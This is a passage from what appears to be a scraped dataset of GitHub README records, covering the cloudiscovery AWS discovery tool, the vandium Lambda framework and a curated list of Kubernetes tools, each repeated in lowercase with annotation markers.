without any route to IGW\nIf EC2 instances and ECS instances are part of an autoscaling group, those instances will be aggregated on a diagram.\nMore information: AWS WA, REL 2: How do you plan your network topology?\nAWS Policy\nExample of a diagram:\nFollowing resources are checked in Policy command:\nAWS Principal that are able to assume roles\nIAM Group\nIAM Group to policy relationship\nIAM Policy\nIAM Role\nIAM Role to policy relationship\nIAM User\nIAM User to group relationship\nIAM User to policy relationship\nSome roles can be aggregated to simplify the diagram. If a role is associated with a principal and is not attached to any named policy, will be aggregated.\nMore information: AWS WA, SEC 3: How do you manage permissions for people and machines?\nAWS IoT\nExample of a diagram:\nFollowing resources are checked in IoT command:\nIoT Billing Group\nIoT Certificates\nIoT Jobs\nIoT Policies\nIoT Thing\nIoT Thing Type\nAWS All\nA command to list ALL AWS resources.\nExample of an HTML report:\nThe command calls all AWS services (200+) and operations with name Describe, Get... and List... (500+).\nThe operations must be allowed to be called by permissions described in AWS Permissions.\nTypes of resources mostly cover Terraform types. It is possible to narrow down scope of the resources to ones related with a given service with parameter -s e.g. -s ec2,ecs,cloudfront,rds.\nMore information: AWS WA, COST 2: How do you govern usage?\nAWS Limit\nIt's possible to check resources limits across various service in an account. This command implements over 60 limits checks.\nExample of an HTML report:\nWith --services value,value,value parameter, you can narrow down checks to just services that you want to check.\nWith --threshold 0-100 option, you can customize a minimum percentage threshold to start reporting a warning.\nServices available\nAcm\nAmplify\nApigateway\nAppmesh\nAppsync\nAutoscaling Plans\nBatch\nChime\nCode Artifact\nCode Build\nCode Commit\nCode Deploy\nCodeguru Reviewer\nCodeguru Profiler\nCognito Federated Identities\nCloudformation\nCloud Map\nCloudWatch Logs\nDynamodb\nEBS\nEC2\nECR\nECS\nElastic Inference\nElastic Filesystem\nElastic Beanstalk\nElastic Loadbalancing\nForecast\nFraud Detector\nGamelift\nGlue\nIAM\nInspector\nKendra\nKMS\nMedia Connect\nMedia Live\nMedia Package\nMetwork Manager\nPolly\nQldb\nRobomaker\nRoute53\nRoute53resolver\nRDS\nS3\nSES\nSNS\nSWF\nTranscribe\nTranslate\nVPC\nAWS has a default quota to all services. At the first time that an account is created, AWS apply this default quota to all services.\nAn administrator can ask to increase the quota value of a certain service via ticket. This command helps administrators detect those issues in advance.\nMore information: AWS WA, REL 1 How do you manage service limits?\nAWS Security\nThis features is experimental, but now you can run commands to check and analyze some security issues. The following commands are available now:\nAccess key age\nEBS Encryption enabled\nEC2 IMDSV2 Check\nDynamoDB PITR Enabled\nIncoming SSH Disabled\nCloudtrail enabled\nRegions outside of main partition\nIf you wish to analyze accounts in regions outside the main AWS partition (e.g. GovCloud or China), you should provide credentials (e.g. a profile) that are applicable to a given partition. It's not possible to analyze regions from multiple partitions.\nUsing a Docker container\nTo build docker container using Dockerfile\ndocker build -t cloudiscovery .\nAfter build container, you must start container using follow command. The run command will mount a filesystem with your actual aws cli credentials, then you won't need configure aws cli again.\ndocker run \\\n-it \\\n--mount type=bind,source=$HOME/.aws/,target=/root/.aws/,readonly \\\ncloudiscovery \\\n/bin/bash\nIf you are using Diagram output and due to fact container is a slim image of Python image, you must run cloudiscovery with \"--diagram no\", otherwise you'll have an error about \"xdg-open\". The output file will be saved in \"assets/diagrams\".\nTranslate\nThis project support English and Portuguese (Brazil) languages. To contribute with a translation, follow this steps:\nCreate a folder inside locales folder with prefix of new idiom with appropiate locale code. Copy \"locales/messages.pot\" to locales/newfolder/LC_MESSAGES/.\nTo build \".mo\" file running this command from project root folder:\npython msgfmt.py -o locales/NEWFOLDER/LC_MESSAGES/messages.mo locales/NEWFOLDER/LC_MESSAGES/messages\nContributing\nIf you have improvements or fixes, we would love to have your contributions. Please use PEP 8 code style.\nDevelopment\nWhen developing, it's recommended to use venv.\nIn order to create a venv on macOS and Linux:\npython3 -m venv env\nOn Windows:\npy -m venv venv\nOR\npython -v venv venv\nOnce installed, you need to activate the virtual environment. Activation will put specific paths for python and pip commands. On macOS and Linux call:\nsource venv/bin/activate\nOn Windows:\n.\\venv\\Scripts\\activate\nMake sure you have installed pre-commit.\nInstall development requirements:\npip install -U -r requirements.txt -r requirements-dev.txt\nAdd precommit hooks:\npre-commit install\nTo run pre-commit hooks, you can issue the following command:\npre-commit run --all-files\nRunning cloudiscovery in development mode:\npython cloudiscovery/__init__.py OPTIONS\nTo add new resources to check limit, please remove \"assets/.cache/cache.db\"\nMaking a release\nUpdate the version in cloudiscovery/__init__.py and create a new git tag with git tag $VERSION.\nOnce you push the tag to GitHub with git push --tags, a new CircleCI build is triggered.\nSimilar projects and products\nmingrammer/diagrams - library being used to draw diagrams\nLucidchart Cloud Insights - commercial extension to Lucidchart\nCloudcraft - commercial visualization tool", "link": "https://github.com/Cloud-Architects/cloudiscovery", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "cloudiscovery\ncloudiscovery helps you to analyze resources in your cloud (aws/gcp/azure/alibaba/ibm) account. now this -----> tool !!!  only can check resources in aws, but we are working to expand to other providers.\nthe tool consists of various commands to help you understand the cloud infrastructure.\nfeatures\ndiagrams\ncommands can generate diagrams. when modelling them, we try to follow the principle:\ngraphical excellence is that which gives to the viewer the greatest number of ideas in the shortest time with the least ink in the smallest space.\nedward tufte\nreport\nthe commands generate reports that can be used to further analyze resources.\ncli\nrun the cloudiscovery command with following options (if a region not pass, this script will try to get it from ~/.aws/credentials):\n1.1 to detect aws vpc resources (more on aws vpc):\ncloudiscovery aws-vpc [--vpc-id vpc-xxxxxxx] --region-name xx-xxxx-xxx [--profile-name profile] [--diagram [yes/no]] [--filter xxx] [--verbose]\n1.2 to detect aws policy resources (more on aws policy):\ncloudiscovery aws-policy [--profile-name profile] [--diagram [yes/no]] [--filter xxx] [--verbose]\n1.3 to detect aws iot resources (more on aws iot):\ncloudiscovery aws-iot [--thing-name thing-xxxx] --region-name xx-xxxx-xxx [--profile-name profile] [--diagram [yes/no]] [--filter xxx] [--verbose]\n1.4 to detect all aws resources (more on aws all):\ncloudiscovery aws-all --region-name xx-xxxx-xxx [--profile-name profile] [--services xxx,xxx] [--filter xxx] [--verbose]\n1.5 to check aws limits per resource (more on aws limit):\ncloudiscovery aws-limit --region-name xx-xxxx-xxx [--profile-name profile] [--services xxx,xxx] [--usage 0-100] [--verbose]\n1.6 to run aws security controls (experimental feature):\ncloudiscovery aws-security --region-name xx-xxxx-xxx [--profile-name profile] [--commands x] [--verbose]\nfor help use:\ncloudiscovery [aws-vpc|aws-policy|aws-iot|aws-all|aws-limit] -h\ndebbuging\nenabling verbose mode, it is possible to debug all calls to the providers endpoints and check possible problems.\nfiltering\nit's possible to filter resources by tags and resource type. to filter, add an option --filter <value>, where <value> can be:\nname=tags.costcenter;value=20000 - to filter resources by a tag name costcenter and with value 20000.\nname=type;value=aws_lambda_function to only list lambda functions.\nit's possible to pass multiple values, to be able to select a value from a set. values are split by : sign. if a desired value has a : sign, wrap it in ' signs e.g. --filter=\"name=tags.costcenter;value=20000:'20001:1'.\nit is possible to pass multiple filter options, just pass -f filter_1 -f filter_2. in that case, the tool will return resources that match either of the filters\nuseful cf tags:\naws:cloudformation:stack-name - stack name\naws:cloudformation:stack-id - stack id\naws:cloudformation:logical-id - logical id defined in cf template\nrequirements and installation\ninstallation\nthis tool has been written in python3+ and aws-cli and it works on linux, windows and mac os.\nmake sure the latest version of aws-cli is installed on your workstation, and other components needed, with python pip already installed:\npip install -u cloudiscovery\nonce a while after installation, there can be some issues related with a cache from older version being used by a newer version. in that case, it's recommended to remove directory ./assets/.cache.\naws credentials\nmake sure you have properly configured your aws-cli with a valid access key and region:\naws configure\nmore on credentials configuration: configuration basics\naws permissions\nthe configured credentials must be associated to a user or role with proper permissions to do all checks. if you want to use a role with narrowed set of permissions just to perform cloud discovery, use a role from the following the cf template maintained by our team.\nto further increase security, you can add a block to check aws:multifactorauthpresent condition in assumerolepolicydocument. more on using iam roles in the configuration file.\n(optional) if you want to be able to switch between multiple aws credentials and settings, you can configure named profiles and later pass profile name when running the tool.\ncommands\ncloudiscovery provides a cli to easily perform desired actions.\naws vpc\nexample of a diagram (diagrams.net supported):\nfollowing resources are checked in vpc command:\nautoscaling group\nclassic/network/application load balancer\nclient vpn endpoints\ncloudhsm\ndocumentdb\ndirectory service\nec2 instance\necs\nefs\nelasticache\nelasticsearch\neks\nemr\niam policy\ninternet gateway (igw)\nlambda\nmedia connect\nmedia live\nmedia store policy\nmsk\nnacl\nnat gateway\nneptune\nquicksight\nrds\nrest api policy\nroute table\ns3 policy\nsagemaker notebook\nsagemaker training job\nsagemaker model\nsecurity group\nsqs queue policy\nsite-to-site vpn connections\nsubnet\nsynthetic canary\nvpc peering\nvpc endpoint\nvpn customer gateways\nvirtual private gateways\nworkspace\nthe subnets are aggregated to simplify the diagram and hide infrastructure redundancies. there can be two types of subnet aggregates:\nprivate* ones with a route 0.0.0.0/0 to internet gateway\npublic* ones without any route to igw\nif ec2 instances and ecs instances are part of an autoscaling group, those instances will be aggregated on a diagram.\nmore information: aws wa, rel 2: how do you plan your network topology?\naws policy\nexample of a diagram:\nfollowing resources are checked in policy command:\naws principal that are able to assume roles\niam group\niam group to policy relationship\niam policy\niam role\niam role to policy relationship\niam user\niam user to group relationship\niam user to policy relationship\nsome roles can be aggregated to simplify the diagram. if a role is associated with a principal and is not attached to any named policy, will be aggregated.\nmore information: aws wa, sec 3: how do you manage permissions for people and machines?\naws iot\nexample of a diagram:\nfollowing resources are checked in iot command:\niot billing group\niot certificates\niot jobs\niot policies\niot thing\niot thing type\naws all\na command to list all aws resources.\nexample of an html report:\nthe command calls all aws services (200+) and operations with name describe, get... and list... (500+).\nthe operations must be allowed to be called by permissions described in aws permissions.\ntypes of resources mostly cover terraform types. it is possible to narrow down scope of the resources to ones related with a given service with parameter -s e.g. -s ec2,ecs,cloudfront,rds.\nmore information: aws wa, cost 2: how do you govern usage?\naws limit\nit's possible to check resources limits across various service in an account. this command implements over 60 limits checks.\nexample of an html report:\nwith --services value,value,value parameter, you can narrow down checks to just services that you want to check.\nwith --threshold 0-100 option, you can customize a minimum percentage threshold to start reporting a warning.\nservices available\nacm\namplify\napigateway\nappmesh\nappsync\nautoscaling plans\nbatch\nchime\ncode artifact\ncode build\ncode commit\ncode deploy\ncodeguru reviewer\ncodeguru profiler\ncognito federated identities\ncloudformation\ncloud map\ncloudwatch logs\ndynamodb\nebs\nec2\necr\necs\nelastic inference\nelastic filesystem\nelastic beanstalk\nelastic loadbalancing\nforecast\nfraud detector\ngamelift\nglue\niam\ninspector\nkendra\nkms\nmedia connect\nmedia live\nmedia package\nmetwork manager\npolly\nqldb\nrobomaker\nroute53\nroute53resolver\nrds\ns3\nses\nsns\nswf\ntranscribe\ntranslate\nvpc\naws has a default quota to all services. at the first time that an account is created, aws apply this default quota to all services.\nan administrator can ask to increase the quota value of a certain service via ticket. this command helps administrators detect those issues in advance.\nmore information: aws wa, rel 1 how do you manage service limits?\naws security\nthis features is experimental, but now you can run commands to check and analyze some security issues. the following commands are available now:\naccess key age\nebs encryption enabled\nec2 imdsv2 check\ndynamodb pitr enabled\nincoming ssh disabled\ncloudtrail enabled\nregions outside of main partition\nif you wish to analyze accounts in regions outside the main aws partition (e.g. govcloud or china), you should provide credentials (e.g. a profile) that are applicable to a given partition. it's not possible to analyze regions from multiple partitions.\nusing a docker container\nto build docker container using dockerfile\ndocker build -t cloudiscovery .\nafter build container, you must start container using follow command. the run command will mount a filesystem with your actual aws cli credentials, then you won't need configure aws cli again.\ndocker run \\\n-it \\\n--mount type=bind,source=$home/.aws/,target=/root/.aws/,readonly \\\ncloudiscovery \\\n/bin/bash\nif you are using diagram output and due to fact container is a slim image of python image, you must run cloudiscovery with \"--diagram no\", otherwise you'll have an error about \"xdg-open\". the output file will be saved in \"assets/diagrams\".\ntranslate\nthis project support english and portuguese (brazil) languages. to contribute with a translation, follow this steps:\ncreate a folder inside locales folder with prefix of new idiom with appropiate locale code. copy \"locales/messages.pot\" to locales/newfolder/lc_messages/.\nto build \".mo\" file running this command from project root folder:\npython msgfmt.py -o locales/newfolder/lc_messages/messages.mo locales/newfolder/lc_messages/messages\ncontributing\nif you have improvements or fixes, we would love to have your contributions. please use pep 8 code style.\ndevelopment\nwhen developing, it's recommended to use venv.\nin order to create a venv on macos and linux:\npython3 -m venv env\non windows:\npy -m venv venv\nor\npython -v venv venv\nonce installed, you need to activate the virtual environment. activation will put specific paths for python and pip commands. on macos and linux call:\nsource venv/bin/activate\non windows:\n.\\venv\\scripts\\activate\nmake sure you have installed pre-commit.\ninstall development requirements:\npip install -u -r requirements.txt -r requirements-dev.txt\nadd precommit hooks:\npre-commit install\nto run pre-commit hooks, you can issue the following command:\npre-commit run --all-files\nrunning cloudiscovery in development mode:\npython cloudiscovery/__init__.py options\nto add new resources to check limit, please remove \"assets/.cache/cache.db\"\nmaking a release\nupdate the version in cloudiscovery/__init__.py and create a new git tag with git tag $version.\nonce you push the tag to github with git push --tags, a new circleci build is triggered.\nsimilar projects and products\nmingrammer/diagrams - library being used to draw diagrams\nlucidchart cloud insights - commercial extension to lucidchart\ncloudcraft - commercial visualization tool", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000226, "year": null}, {"Unnamed: 0": 241, "autor": 241, "date": null, "content": "AWS Lambda framework for building functions using Node.js for API Gateway, IoT applications, and other AWS events.\nFeatures\nSimplifies writing lambda handlers\nAutomatically verifies event types\nPowerful input validation\nWorks with Serverless\nJSON Web Token (JWT) verification and validation\nJWK support for retrieving keys at startup\nAutomatic loading of environment variables from SSM Parameter Store\nCross Site Request Forgery (XSRF) detection when using JWT\nSQL Injection (SQLi) detection and protection\nLambda Proxy Resource support for AWS API Gateway\nHandler initialization for allocating resources\nPost handler execution to allow deallocation of resources\nForces values into correct types\nHandles uncaught exceptions\nPromise support\nAutomatically trimmed strings for input event data\nLow startup overhead\nAWS Lambda Node.js 12.x\nInstallation\nInstall via npm.\nnpm install vandium --save\nGetting Started\nVandium creates event specific handlers to reduce the amount of code than one needs to maintain. The following handler code will respond with a message when executed using the AWS API Gateway with a GET request:\nconst vandium = require( 'vandium' );\n// handler for an api gateway event\nexports.handler = vandium.api()\n.GET( (event) => {\n// return greeting\nreturn 'Hello ' + event.pathParmeters.name + '!';\n});\nThe framework can process asynchronous responses using promises. The following code returns a User object from a datastore asynchronously:\nconst vandium = require( 'vandium' );\n// our datastore access object\nconst Users = require( './users' );\n// handler for an api gateway event\nexports.handler = vandium.api()\n.GET()\n.validation({\npathParmeters: {\nname: 'string:min=1,max=100,required'\n}\n})\n.handler( async (event) => {\n// returns a promise that resolves the User by name\nreturn await Users.getUser( event.pathParmeters.name );\n});\nAdditionally, resources can be closed at the end, success or failure, of the handler. Failure to close resources might cause the lambda function to timeout or run for longer than is required. The following code demonstrates closing a cache after the handler has been called:\nconst vandium = require( 'vandium' );\n// our datastore access object\nconst Users = require( './users' );\n// object caching - automatically connects on first access\nconst cache = require( './cache' );\n// handler for an api gateway event\nexports.handler = vandium.api()\n.GET((event) => {\n// returns a promise that resolves the User by name\nreturn Users.getUser( event.pathParmeters.name );\n})\n.finally( () => {\n// returns a promise that closes the cache connection\nreturn cache.close();\n});\nVandium supports the following types of AWS Lambda events:\nAPI Gateway\nCloudformation\nCloudwatch\nCognito\nDynamodb\nKinesis\nAlexa\nS3\nScheduled\nSES\nSNS\nDocumentation\nFor documentation on how to use vandium in your project, please see our documentation page.\nFeedback\nWe'd love to get feedback on how to make this tool better. Feel free to contact us at feedback@vandium.io\nLicense\nBSD-3-Clause", "link": "https://github.com/vandium-io/vandium-node", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "aws lambda framework for building functions using node.js for api gateway, iot applications, and other aws events.\nfeatures\nsimplifies writing lambda handlers\nautomatically verifies event types\npowerful input validation\nworks with serverless\njson web token (jwt) verification and validation\njwk support for retrieving keys at startup\nautomatic loading of environment variables from ssm parameter store\ncross site request forgery (xsrf) detection when using jwt\nsql injection (sqli) detection and protection\nlambda proxy resource support for aws api gateway\nhandler initialization for allocating resources\npost handler execution to allow deallocation of resources\nforces values into correct types\nhandles uncaught exceptions\npromise support\nautomatically trimmed strings for input event data\nlow startup overhead\naws lambda node.js 12.x\ninstallation\ninstall via npm.\nnpm install vandium --save\ngetting started\nvandium creates event specific handlers to reduce the amount of code than one needs to maintain. the following handler code will respond with a message when executed using the aws api gateway with a get request:\nconst vandium = require( 'vandium' );\n// handler for an api gateway event\nexports.handler = vandium.api()\n.get( (event) => {\n// return greeting\nreturn 'hello ' + event.pathparmeters.name + '!';\n});\nthe framework can process asynchronous responses using promises. the following code returns a user object from a datastore asynchronously:\nconst vandium = require( 'vandium' );\n// our datastore access object\nconst users = require( './users' );\n// handler for an api gateway event\nexports.handler = vandium.api()\n.get()\n.validation({\npathparmeters: {\nname: 'string:min=1,max=100,required'\n}\n})\n.handler( async (event) => {\n// returns a promise that resolves the user by name\nreturn await users.getuser( event.pathparmeters.name );\n});\nadditionally, resources can be closed at the end, success or failure, of the handler. failure to close resources might cause the lambda function to timeout or run for longer than is required. the following code demonstrates closing a cache after the handler has been called:\nconst vandium = require( 'vandium' );\n// our datastore access object\nconst users = require( './users' );\n// object caching - automatically connects on first access\nconst cache = require( './cache' );\n// handler for an api gateway event\nexports.handler = vandium.api()\n.get((event) => {\n// returns a promise that resolves the user by name\nreturn users.getuser( event.pathparmeters.name );\n})\n.finally( () => {\n// returns a promise that closes the cache connection\nreturn cache.close();\n});\nvandium supports the following types of aws lambda events:\napi gateway\ncloudformation\ncloudwatch\ncognito\ndynamodb\nkinesis\nalexa\ns3\nscheduled\nses\nsns\ndocumentation\nfor documentation on how to use vandium in your project, please see our documentation page.\nfeedback\nwe'd love to get feedback on how to make this -----> tool !!!  better. feel free to contact us at feedback@vandium.io\nlicense\nbsd-3-clause", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000241, "year": null}, {"Unnamed: 0": 251, "autor": 251, "date": null, "content": "Kubetools - A Curated List of Kubernetes Tools\nThere are more than 200+ Kubernetes Certified Service Providers and tons of distributions. Choosing a right distribution can be a daunting task. Kubetools is built with a purpose. It is contributed and managed by Collabnix community to target the most popular tools and technique and coming up with the best practices around these tools.\nCurrently, we are maintaining a database of 300+ Kubernetes tools but there is a plan to take it to next step and help you pick up the most popular tool for your infrastructure.\nHave Questions? Join us over Slack and get chance to be a part of 5500+ DevOps enthusiasts.\nWant to contribute? Click here and get your favorite tool added.\nCluster Management\nkops - Production Grade K8s Installation, Upgrades, and Management\nsilver-surfer - Check ApiVersion compatibility and provide Migration path for Kubernetes objects when upgrading Kubernetes to latest versions\nKube-ops-view - Kubernetes Operational View - read-only system dashboard for multiple K8s clusters\nkubeprompt - Kubernetes prompt info\nMetalk8s - An opinionated Kubernetes distribution with a focus on long-term on-prem deployments\nkind - Kubernetes IN Docker - local clusters for testing Kubernetes\nClusterman - Cluster Autoscaler for Kubernetes and Mesos\nCert-manager - Automatically provision and manage TLS certificates\nGoldilocks - Get your resource requests \"Just Right\"\nkatafygio - Dump, or continuously backup Kubernetes objets as yaml files in git\nRancher - Complete container management platform\nSealed Secrets - A Kubernetes controller and tool for one-way encrypted Secrets\nOpenKruise/Kruise - Automate application workloads management on Kubernetes https://openkruise.io\nkubectl snapshot - Take Cluster Snapshots\nkapp - simple deployment tool focused on the concept of \"Kubernetes application\" \u2014 a set of resources with the same label https://get-kapp.io\nkeda - Event-driven autoscaler for Kubernetes\nOctant - To better understand the complexity of Kubernetes clusters\nPortainer - Portainer inside a Kubernetes environment\nGardener - Deliver fully-managed clusters at scale everywhere with your own Kubernetes-as-a-Service\nKubed - Kubernetes Cluster Operator Daemon\nKubestack - Kubestack is the free and open-source GitOps framework to codify your custom platform stack using Terraform.\nCluster with Core CLI tools\nBootkube - bootkube - Launch a self-hosted Kubernetes cluster\nkubectx + kubens - Switch faster between clusters and namespaces in kubectl\nkube-shell - Kubernetes shell: An integrated shell for working with the Kubernetes\nkuttle: kubectl wrapper for sshuttle without SSH - Kubernetes wrapper for sshuttle\nkubectl sudo - Run kubernetes commands with the security privileges of another user\nK9s - Kubernetes CLI To Manage Your Clusters In Style!\nKtunnel - A cli that exposes your local resources to kubernetes\nKubeOperator - Run kubectl command in Web Browser. https://kubeoperator.io/\nVimkubectl - Manage any Kubernetes resource from Vim https://www.vim.org/scripts/script.ph\nKubeHelper - KubeHelper - simplifies many daily Kubernetes cluster tasks through a web interface.\nAlert and Monitoring\nThanos - Highly available Prometheus setup with long term storage capabilities. CNCF Sandbox project. https://thanos.io\nPrometheus - The Prometheus monitoring system and time series database.\nGrafana - The tool for beautiful monitoring and metric analytics & dashboards for Graphite, InfluxDB & Prometheus & More\nKubetail - Bash script to tail Kubernetes logs from multiple pods at the same time\nSearchlight - Alerts for Kubernetes\nlinkerd2 Monitoring Mixin for Grafana - Grafana dashboards for linkerd2 monitoring and can work in standalone (default) or in multi cluster setup\nkuberhaus - Kubernetes resource dashboard with node/pod layout and resource requests\nKubernetes Job/CronJob Notifier - This tool sends an alert to slack whenever there is a Kubernetes cronJob/Job failure/success\nArgus - This tool monitors changes in the filesystem on specified paths\nLogging and Tracing\nJaeger - CNCF Jaeger, a Distributed Tracing Platform\nKiali - Kiali project, observability for the Istio service mesh\nELK - Elasticsearch, Logstash, Kibana\nfluentbit - Fast and Lightweight Log processor and forwarder for Linux, BSD and OSX\nLoki - Like Prometheus, but for logs\nTroubleshooting\nKubectl-debug - Allows you to run a new container with all the troubleshooting tools installed in running pod for debugging purpose\nPowerfulSeal - A powerful testing tool for Kubernetes clusters\nCrash-diagnostic - Crash-Diagnostics is a tool to help investigate, analyze, and troubleshoot unresponsive or crashed Kubernetes clusters\nK9s - Kubernetes CLI To Manage Your Clusters In Style!\nKubernetes CLI Plugin - Doctor - kubectl cluster triage plugin for k8s - \ud83c\udfe5 (brew doctor equivalent)\nKnative Inspect - A light-weight debugging tool for Knative's system components\nKubeman - To find information from Kubernetes clusters, and to investigate issues related to Kubernetes and Istio\nkpexec - kpexec is a kubernetes cli that runs commands in a container with high privileges\nDevelopement Tools/Kit\nOkteto: A Tool for Cloud Native Developers - Build better applications by developing and testing your code directly in Kubernetes\nTilt: Tilt manages local development instances for teams that deploy to Kubernetes - Local Kubernetes development with no stress\nGarden: Kubernetes from source to finish - Development orchestrator for Kubernetes, containers and functions.\nKuberNix - Single dependency Kubernetes clusters for local testing, experimenting and development\nCopper - A configuration file validator for Kubernetes\nko - Build and deploy Go applications on Kubernetes\nDekorate - Java annotation processors for Kubernetes\nLens IDE The Kubernetes IDE\nKosko - Organize Kubernetes manifests in JavaScript\nTelepresence - Fast, local development for Kubernetes and Openshift microservices\nMonokle - Desktop UI for managing Kubernetes manifests\nKr8s - Desktop application made for developers that need to monitor and visualize their Kubernetes clusters in a user friendly GUI\nAlternative Tools for Developement\nMinikube - minikube implements a local Kubernetes cluster\nKubeSphere - Easy-to-use Production Ready Container Platform https://kubesphere.io\nskippbox - A Desktop application for k8s\nkind - Kubernetes IN Docker - local clusters for testing Kubernetes https://kind.sigs.k8s.io/\nk3d - k3d is a lightweight wrapper to run k3s (Rancher Lab\u2019s minimal Kubernetes distribution) in docker.\nCI/CD integration Tools\nHybridK8s Droid - Intelligence foor your favourite Delivery Platform\nDevtron - Software Delivery Workflow for Kubernetes\nSkaffold - Easy and Repeatable Kubernetes Development\nApollo - Apollo - The logz.io continuous deployment solution over kubernetes\nHelm Cabin - Web UI that visualizes Helm releases in a Kubernetes cluster\nflagger - Progressive delivery Kubernetes operator (Canary, A/B Testing and Blue/Green deployments)\nKubeform - Kubernetes CRDs for Terraform providers https://kubeform.com\nSpinnaker - Spinnaker is an open source, multi-cloud continuous delivery platform for releasing software changes with high velocity and confidence. http://www.spinnaker.io/\nwerf - GitOps tool to deliver apps to Kubernetes and integrate this process with GitLab and other CI tools\nFlux - GitOps Kubernetes operator\nArgo CD - Declarative continuous deployment for Kubernetes\nTekton - A cloud native continuous integration and delivery (CI/CD) solution\nJenkins X - Jenkins X provides automated CI+CD for Kubernetes with Preview Environments on Pull Requests using Tekton, Knative, Lighthouse, Skaffold and Helm\nKubeVela - KubeVela works as an application delivery control plane that is fully decoupled from runtime infrastructure\nksonnet - A CLI-supported framework that streamlines writing and deployment of Kubernetes configurations to multiple clusters\nCircleCI - A cloud-based tool that helps build continuous integration and continuous delivery pipelines to Kubernetes.\nSecurity Tools\nTerraScan - Detect compliance and security violations across Infrastructure as Code to mitigate risk before provisioning cloud native infrastructure.\nklum - Kubernetes Lazy User Manager\nKyverno - Kubernetes Native Policy Management https://kyverno.io\nkiosk - kiosk office Multi-Tenancy Extension For Kubernetes - Secure Cluster Sharing & Self-Service Namespace Provisioning\nkube-bench - CIS Kubernetes Benchmark tool\nkube-hunter - Pentesting tool - Hunts for security weaknesses in Kubernetes clusters\nkube-who-can - Show who has RBAC permissions to perform actions on different resources in Kubernetes\nstarboard - Kubernetes-native security toolkit\nSimulator - Kubernetes Security Training Platform - Focussing on security mitigation\nRBAC Lookup - Easily find roles and cluster roles attached to any user, service account, or group name in your Kubernetes cluster https://fairwinds.com\nKubeaudit - kubeaudit helps you audit your Kubernetes clusters against common security controls\nGangway - An application that can be used to easily enable authentication flows via OIDC for a kubernetes cluster\nAudit2rbac - Autogenerate RBAC policies based on Kubernetes audit logs\nChartsec - Helm Chart security scanner\nkubestriker - Security Auditing tool\nDatree - CLI tool to prevent K8s misconfigurations by ensuring that manifests and Helm charts follow best practices as well as your organization\u2019s policies\nKrane - Kubernetes RBAC static Analysis & visualisation tool\nFlaco - The Falco Project - Cloud-Native runtime security\nClair - Vulnerability Static Analysis for Containers\nAnchore Cli - Coomand Line Interface built on top of anchore engine to manage and inspect images, policies, subscriptions and registries\nProject Quay - Container image registry designed to boost the security of your repositories via vulnerability scanning and tight access control\nKubescape - Tool to test if Kubernetes is deployed securely according to multiple frameworks: regulatory, customized company policies and DevSecOps best practices, such as the NSA-CISA and the MITRE ATT&CK\u00ae\nNetwork Policies\ntrireme-kubernetes - Aporeto integration with Kubernetes Network Policies\nCalico - Cloud native connectivity and network policy\nkubepox - Kubernetes network Policy eXploration tool\nkokotap - Tools for kubernetes pod network tapping\nSubmariner - Connect all your Kubernetes clusters, no matter where they are in the world\negress-operator - An operator to produce egress gateway pods and control access to them with network policies\nkubefwd (Kube Forward) - Bulk port forwarding Kubernetes services for local development\nTesting Tools\nk6 - A modern load testing tool, using Go and JavaScript\nNetwork bandwith and load testing - Test suite for Kubernetes\ntest-infra - Test infrastructure for the Kubernetes project\nkube-score - Kubernetes object analysis with recommendations for improved reliability and security\nLitmus - Cloud-Native Chaos Engineering; Kubernetes-Native Chaos Engineering; Chaos Engineering for Kubernetes\nPowerfulSeal - A powerful testing tool for Kubernetes clusters\nkube-burner - Kube-burner is a tool aimed at stressing kubernetes clusters\nkube-monkey - kube-monkey randomly deletes k8 pods in the cluster to validate failure-resilient services\nconftest - Write tests against structured configuration data using the Open Policy Agent Rego query language\nService Mesh\nIstio - Connect, secure, control, and observe services\nTraefik - The Cloud Native Edge Router\nNGINX Ingress Controller - NGINX and NGINX Plus Ingress Controllers for Kubernetes\nAutopilot - THE SERVICE MESH SDK\nlinkerd-config - A Kubernetes controller that knows how to reconcile the Linkerd configuration\nKong - Kong for Kubernetes: the official Ingress Controller for Kubernetes\nOSM - Open Service Mesh (OSM) is a lightweight, extensible, cloud native service mesh\nLayer5 - Layer5, the service mesh company, representing every service mesh\nGloo Mesh - The Service Mesh Orchestration Platform\nAPISIX Apache APISIX is a dynamic, real-time, high-performance API gateway.\nObservability\nKubespy - Tools for observing Kubernetes resources in real time\nPopeye - A Kubernetes cluster resource sanitizer\nStern - Multi pod and container log tailing for Kubernetes\nCri-tools - CLI and validation tools for Kubelet Container Runtime Interface (CRI)\nKubebox - Terminal and Web console for Kubernetes\nKubewatch - Watch k8s events and trigger Handlers\nkube-state-metrics - Add-on agent to generate and expose cluster-level metrics\nSloop - Kubernetes History Visualization\nkubectl tree \ud83c\udf84 - Kubectl plugin to observe object hierarchies through ownerReferences\nchaoskube - chaoskube periodically kills random pods in your Kubernetes cluster\nBotKube - Helps you monitor your Kubernetes cluster(s), debug critical deployments and gives recommendations for standard practices\nKubestone - Kubestone is a benchmarking Operator that can evaluate the performance of Kubernetes installations\nChaos Mesh - A Chaos Engineering Platform for Kubernetes\nLemur - LEMUR: Observability and Context\nkubernetes-event-exporter - Export Kubernetes events to multiple destinations with routing and filtering\nKubevious - Kubevious provides a usable and highly graphical interface for Kubernetes\nMachine Learning/Deep Learning\nKubeflow - Machine Learning Toolkit for Kubernetes\nVolcano - A Kubernetes Native Batch System\nCompute Edge Tools\nKubeEdge - Kubernetes Native Edge Computing Framework\nKubeless - Kubernetes Native Serverless Framework\nKubernetes Tools for Specific Cloud\nKubernetes on AWS (kube-aws) - A command-line tool to declaratively manage Kubernetes clusters on AWS\nDraft: Streamlined Kubernetes Development - A tool for developers to create cloud-native applications on Kubernetes\nhelm-ssm - A low dependency tool for retrieving and injecting secrets from AWS SSM into Helm\nSkupper - Multicloud communication for Kubernetes\nStorage Providers\nChubaoFS - distributed file system and object storage\nLonghorn - Cloud-Native distributed block storage built on and for Kubernetes\nOpenEBS - Kubernetes native - hyperconverged block storage with multiple storage engines\nRook - Storage Orchestration for Kubernetes\nSeaweedFS - Distributed file system supports read-write many volumes\nTiKV - Distributed transactional key-value database\nvelero - Backup and migrate Kubernetes applications and their persistent volumes\nVitess - Vitess is a database clustering system for horizontal scaling of MySQL\nkaDalu - A lightweight Persistent storage solution for Kubernetes / OpenShift using 